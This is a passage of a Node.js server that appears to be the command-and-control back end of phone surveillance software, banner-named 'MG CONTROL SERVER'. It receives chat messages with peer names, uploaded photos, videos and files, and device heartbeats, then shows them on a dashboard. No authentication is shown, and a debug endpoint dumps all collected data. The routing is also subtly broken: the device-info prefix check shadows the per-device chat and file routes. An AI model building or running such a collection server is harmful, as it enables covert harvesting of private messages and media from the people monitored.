                    device_id: deviceId,
                    mid,
                    direction: raw.direction === "out" ? "out" : "in",
                    peer_uid: number(raw.peerUid),
                    peer_name: clean(raw.peerName),
                    text: clean(raw.text).slice(0, 500),
                    message_time: number(raw.time) || Date.now(),
                    received_at: Date.now()
                });
            }

            if (!rows.length) {
                return jsonResponse(res, { ok: true, inserted: 0, skipped });
            }

            const { data: insertedRows, error: messageError } = await supabase
                .from("messages")
                .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
                .select("device_id,mid");

            if (messageError) {
                console.error("Message insert error:", messageError);
                return jsonResponse(res, { ok: false, error: "database error" }, 500);
            }

            const inserted = insertedRows?.length || 0;
            return jsonResponse(res, {
                ok: true,
                inserted,
                skipped: skipped + (rows.length - inserted)
            });
        }

        // ============================================
        // FILE UPLOAD (RAW BINARY)
        // ============================================
        if (req.method === "POST" && url.pathname === "/upload") {
            const contentType = req.headers["content-type"] || "";
            const deviceId = url.searchParams.get("deviceId") || "unknown";
            const fileName = url.searchParams.get("name") || "file.bin";
            const cleanFileName = path.basename(fileName);

            if (contentType.includes("application/octet-stream") ||
                contentType.includes("image/jpeg") ||
                contentType.includes("image/png") ||
                contentType.includes("video/mp4")) {

                let buffer = Buffer.alloc(0);
                req.on("data", (chunk) => {
                    buffer = Buffer.concat([buffer, chunk]);
                });

                req.on("end", () => {
                    try {
                        const safeName = `${Date.now()}_${cleanFileName}`;
                        const filePath = path.join(UPLOAD_DIR, safeName);
                        fs.writeFileSync(filePath, buffer);

                        const thumbName = `thumb_${safeName}`;
                        const thumbPath = path.join(THUMB_DIR, thumbName);
                        fs.copyFileSync(filePath, thumbPath);

                        saveLog({
                            type: "file",
                            file: safeName,
                            original: cleanFileName,
                            folder: ".",
                            thumb: thumbName,
                            device_id: deviceId,
                            ip: getIP(req),
                            size: buffer.length,
                            time: new Date().toISOString()
                        });

                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${cleanFileName} (${buffer.length} bytes)`);

                        jsonResponse(res, {
                            ok: true,
                            file: safeName,
                            device_id: deviceId,
                            message: "File uploaded successfully"
                        });

                    } catch (error) {
                        console.error("Upload error:", error);
                        jsonResponse(res, { ok: false, error: "Upload failed" }, 500);
                    }
                });

                req.on("error", () => {
                    jsonResponse(res, { ok: false, error: "Upload failed" }, 500);
                });

                return;
            }

            return jsonResponse(res, { ok: false, error: "Raw binary required" }, 400);
        }

        // ============================================
        // GET ALL FILES
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/all-files") {
            const logs = readLogs();
            const files = logs
                .filter(entry => entry.type === "file")
                .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
                .slice(0, 100);
            return jsonResponse(res, { ok: true, files });
        }

        // ============================================
        // GET DEVICE FILES
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/files") {
            const deviceId = url.searchParams.get("deviceId");
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const files = getDeviceFiles(deviceId);
            return jsonResponse(res, { ok: true, files });
        }

        // ============================================
        // GET DEVICE INFO (API)
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/api/device/")) {
            const deviceId = url.pathname.split("/").pop();
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const device = await getDeviceInfo(deviceId);
            if (!device) {
                return jsonResponse(res, { ok: false, error: "Device not found" }, 404);
            }
            return jsonResponse(res, { ok: true, device });
        }

        // ============================================
        // GET DEVICE CHATS (API)
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/api/device/") && url.pathname.endsWith("/chats")) {
            const parts = url.pathname.split("/");
            const deviceId = parts[parts.length - 2];
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const messages = await getDeviceChats(deviceId);
            return jsonResponse(res, { ok: true, messages });
        }

        // ============================================
        // GET DEVICE FILES (API)
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/api/device/") && url.pathname.endsWith("/files")) {
            const parts = url.pathname.split("/");
            const deviceId = parts[parts.length - 2];
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const files = getDeviceFiles(deviceId);
            return jsonResponse(res, { ok: true, files });
        }

        // ============================================
        // SERVE UPLOADS
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
            const fileName = url.pathname.split("/").pop();
            const filePath = path.join(UPLOAD_DIR, fileName);
            if (!fs.existsSync(filePath)) {
                res.writeHead(404);
                res.end("File not found");
                return;
            }
            res.writeHead(200, { "Content-Type": "application/octet-stream", "Cache-Control": "no-cache" });
            fs.createReadStream(filePath).pipe(res);
            return;
        }

        // ============================================
        // SERVE THUMBNAILS
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) {
            const fileName = url.pathname.split("/").pop();
            const filePath = path.join(THUMB_DIR, fileName);
            if (!fs.existsSync(filePath)) {
                res.writeHead(404);
                res.end("File not found");
                return;
            }
            res.writeHead(200, { "Content-Type": "image/jpeg", "Cache-Control": "no-cache" });
            fs.createReadStream(filePath).pipe(res);
            return;
        }

        // ============================================
        // DELETE FILE
        // ============================================
        if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
            const fileName = url.pathname.split("/").pop();
            if (!fileName) {
                return jsonResponse(res, { ok: false, error: "fileName required" }, 400);
            }
            const filePath = path.join(UPLOAD_DIR, fileName);
            const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);
            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);
            removeFileLogEntries(fileName);
            return jsonResponse(res, { ok: true, message: "File deleted" });
        }

        // ============================================
        // DEBUG API
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/debug") {
            const [devicesResult, messagesResult] = await Promise.all([
                supabase.from("devices").select("*").order("server_last_seen", { ascending: false }),
                supabase.from("messages").select("*").order("message_time", { ascending: false }).limit(5000)
            ]);

            const logs = readLogs();
            const files = logs.filter(entry => entry.type === "file");

            const messagesByDevice = {};
            for (const msg of messagesResult.data || []) {
                if (!messagesByDevice[msg.device_id]) messagesByDevice[msg.device_id] = [];
                messagesByDevice[msg.device_id].push(msg);
            }

            const filesByDevice = {};
            for (const file of files) {
                const id = file.device_id || "unknown";
                if (!filesByDevice[id]) filesByDevice[id] = [];
                filesByDevice[id].push(file);
            }

            return jsonResponse(res, {
                devices: devicesResult.data || [],
                messages: messagesByDevice,
                files: filesByDevice
            });
        }

        return jsonResponse(res, { ok: false, error: "not found" }, 404);

    } catch (error) {
        console.error(error);
        return jsonResponse(res, { ok: false, error: "server error" }, 500);
    }
});

// ============================================
// START SERVER
// ============================================

server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🚀 MG CONTROL SERVER                                      ║
║   📡 Running on: http://localhost:${PORT}                     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📋 FEATURES:                                              ║
║      ✅ Device Dashboard (Click to view)                    ║
║      ✅ Device Info Tab                                     ║
║      ✅ Device-Specific Chats Tab                           ║
║      ✅ Device-Specific Files Tab                           ║
║      ✅ File Preview Modal                                  ║
║      ✅ File Delete                                         ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📌 ENDPOINTS:                                             ║
║      GET  /                       - Dashboard               ║
║      GET  /config                 - App config              ║
║      POST /api/heartbeat          - Device heartbeat        ║
║      POST /api/chat/batch         - Chat messages           ║
║      POST /upload                 - File upload             ║
║      GET  /api/device/:id         - Device info             ║
║      GET  /api/device/:id/chats   - Device chats            ║
║      GET  /api/device/:id/files   - Device files            ║
║      GET  /api/all-files          - All files               ║
║      GET  /uploads/*              - Serve uploaded files    ║
║      GET  /thumbs/*               - Serve thumbnails        ║
║      DELETE /api/file/*           - Delete file             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
